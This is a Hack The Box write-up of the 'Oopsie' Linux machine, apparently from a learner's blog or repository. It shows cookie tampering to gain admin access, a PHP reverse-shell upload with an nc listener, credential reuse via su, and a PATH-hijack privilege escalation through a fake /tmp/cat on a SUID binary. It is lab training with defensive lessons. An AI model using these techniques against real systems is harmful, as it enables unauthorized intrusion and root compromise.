# 🏴 Hack The Box — Oopsie

> **Difficulty:** Very Easy
> **OS:** Linux
> **Platform:** Hack The Box
> **Status:** ✅ Pwned

---

## 📌 Overview

**Oopsie** was one of my first Hack The Box machines.

The machine gave me hands-on experience with:

* Nmap enumeration
* HTTP reconnaissance
* Information disclosure
* Cookie manipulation
* Broken access control
* File upload abuse
* PHP reverse shells
* Linux enumeration
* Credential reuse
* Lateral movement with `su`
* SUID binaries
* PATH hijacking
* Linux privilege escalation

---

# 🔎 1. Enumeration

I started by scanning the target with Nmap to identify open ports and determine what services were running.

```bash
nmap -sC -sV <TARGET_IP>
```

The scan revealed two interesting services:

|     Port | Service | Purpose         |
| -------: | ------- | --------------- |
| `22/tcp` | SSH     | Remote access   |
| `80/tcp` | HTTP    | Web application |

Since HTTP was available, I opened the target IP in a browser.

### 🌐 Web Application

The website appeared to be related to an automotive company.

While exploring the application, I found information indicating that there was a login system.

I also inspected the page source, which revealed a login page that wasn't immediately obvious from the main page.

At this point, the web application became the primary attack surface.

---

# 🔐 2. Guest Access

I tested a few common/default credentials but wasn't able to authenticate as an administrator.

However, the application provided a **Guest login** option.

After logging in as `guest`, additional functionality became available.

This was interesting because the guest account could access parts of the application that weren't visible before authentication.

I started looking at how the application handled authentication and authorization.

---

# 🕵️ 3. Information Disclosure & Cookie Manipulation

I inspected the application's cookies and noticed that information related to the logged-in user's identity and role was stored client-side.

I tested whether changing the user identifier would expose information about other accounts.

By modifying the relevant value, I was able to retrieve information about another user.

This resulted in an **information disclosure / broken access-control vulnerability**.

More importantly, I discovered the identifier associated with the administrator account.

The application was trusting client-controlled values for authorization.

I therefore modified the relevant cookie values so that my session represented the administrator account.

After refreshing the application, I gained access to functionality that was previously restricted — including the **file upload functionality**.

### 🔑 Lesson

A server should never trust authorization information supplied by the client.

Values such as:

```text
user ID
role
privilege level
```

must be validated server-side.

---

# 🚪 4. Foothold — File Upload

With administrative functionality available, I found an upload form.

Because the application was PHP-based, I investigated whether I could upload a PHP payload and execute it through the web server.

I used a PHP reverse shell and modified the callback settings to point back to my attacking machine.

Before triggering the shell, I started a listener:

```bash
nc -lvnp <LISTENER_PORT>
```

I then uploaded the PHP payload.

---

## 📂 Locating the Uploaded File

Rather than blindly searching through directories, I first made an educated guess about where uploaded files would be stored.

I also used directory enumeration to confirm the location.

For example:

```bash
gobuster dir -u http://<TARGET_IP>/ -w <WORDLIST>
```

After locating the uploaded file and accessing it through the browser, the reverse shell connected back to my machine.

I now had command execution on the target as:

```text
www-data
```

---

# 🐚 5. Stabilizing the Shell

The initial reverse shell was limited.

I upgraded it to a more usable Bash shell using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This made interacting with the target considerably easier.

At this stage:

```text
Attacker
   │
   │ Reverse Shell
   ▼
www-data
```

I had a foothold, but `www-data` had limited privileges.

---

# 🔄 6. Lateral Movement

Since the web application was running PHP, I started examining the application's files for configuration mistakes, credentials, and other sensitive information.

I searched through the web directory and found interesting PHP files under:

```text
/var/www/html/
```

Further enumeration revealed credentials stored within the application's files.

I then checked the users present on the system:

```bash
cat /etc/passwd
```

One of the interesting users was:

```text
robert
```

The recovered password appeared to be reusable.

I tested the credentials by switching users:

```bash
su robert
```

This worked.

I had successfully moved from:

```text
www-data → robert
```

---

# ⬆️ 7. Privilege Escalation

Now that I had access as `robert`, I started checking the user's privileges.

I first performed some basic enumeration:

```bash
id
```

The output showed that `robert` belonged to the:

```text
bugtracker
```

group.

That gave me another avenue to investigate.

I searched for files belonging to that group:

```bash
find / -group bugtracker 2>/dev/null
```

This revealed a binary associated with the group:

```text
bugtracker
```

---

# 🔬 8. SUID Binary

I checked the binary's permissions and file type.

The important discovery was that the binary had the **SUID bit** set and was owned by `root`.

Conceptually, this meant:

```text
robert
  │
  │ executes
  ▼
bugtracker
  │
  │ SUID
  ▼
root privileges
```

The binary accepted a filename as input and internally used the `cat` command to read that file.

The important problem was that the program called:

```text
cat
```

without specifying an absolute path such as:

```text
/bin/cat
```

This opened up a potential **PATH hijacking** attack.

---

# 💥 9. PATH Hijacking

I moved to `/tmp` and created a malicious executable named:

```text
cat
```

The file contained:

```bash
#!/bin/bash
/bin/bash
```

I then made it executable:

```bash
chmod +x cat
```

The idea was to make the SUID `bugtracker` binary execute my malicious `cat` instead of the legitimate `/bin/cat`.

To do that, I placed `/tmp` at the beginning of my `PATH`:

```bash
export PATH=/tmp:$PATH
```

I verified the modified path:

```bash
echo $PATH
```

Because `/tmp` appeared first, the system would search there before the normal system directories.

I then executed the vulnerable SUID binary.

The binary attempted to execute:

```text
cat
```

but because of the modified `PATH`, it executed my malicious `/tmp/cat` instead.

That spawned a Bash shell with the privileges of the SUID process.

---

# 🏁 10. Root

The privilege escalation succeeded.

I verified my privileges:

```bash
whoami
```

The result:

```text
root
```

### Final attack chain

```text
                    OOPSIE
                       │
                       ▼
               Nmap Enumeration
                       │
                       ▼
                HTTP / Web App
                       │
                       ▼
                 Guest Access
                       │
                       ▼
          Cookie Manipulation
                       │
                       ▼
              Admin Access
                       │
                       ▼
                File Upload
                       │
                       ▼
             PHP Reverse Shell
                       │
                       ▼
                   www-data
                       │
                       ▼
          Credential Discovery
                       │
                       ▼
                    robert
                       │
                       ▼
              SUID Enumeration
                       │
                       ▼
              bugtracker Binary
                       │
                       ▼
               PATH Hijacking
                       │
                       ▼
                     ROOT
```

---

# 🧠 What I Learned

### 1. Don't stop at the login page

Even when default credentials failed, the guest functionality exposed additional attack surface.

### 2. Client-side authorization is dangerous

If the server trusts values such as `role=admin` from the client, an attacker may be able to manipulate their privileges.

Authorization decisions should happen server-side.

### 3. File uploads can become code execution

An upload feature becomes dangerous when an application allows executable files to reach a location where the web server can execute them.

### 4. Credentials can leak through application files

Web applications often contain configuration files, source code, database credentials, and other sensitive information.

### 5. SUID binaries deserve attention

A root-owned SUID binary can become a privilege-escalation vector when its functionality is insecure.

### 6. PATH matters

If a privileged program executes a command without using its absolute path, an attacker may be able to influence which executable gets run.

---

# 🛠️ Tools Used

```text
Nmap
Gobuster
Netcat
Python
Linux shell
Browser Developer Tools
```

---

# 🎯 Key Takeaways

The biggest lesson from Oopsie was that a successful compromise wasn't caused by one massive vulnerability.

It was a chain:

```text
Information Disclosure
        +
Broken Access Control
        +
File Upload
        +
Credential Reuse
        +
SUID / PATH Hijacking
        =
Root Access
```

This machine helped me understand why enumeration matters so much in penetration testing.

**Every small piece of information can become useful later in the attack chain.**

---

## 📚 Skills Practiced

`#Nmap` `#Linux` `#WebSecurity` `#Enumeration` `#FileUpload` `#ReverseShell` `#PrivilegeEscalation` `#SUID` `#PathHijacking` `#HackTheBox`
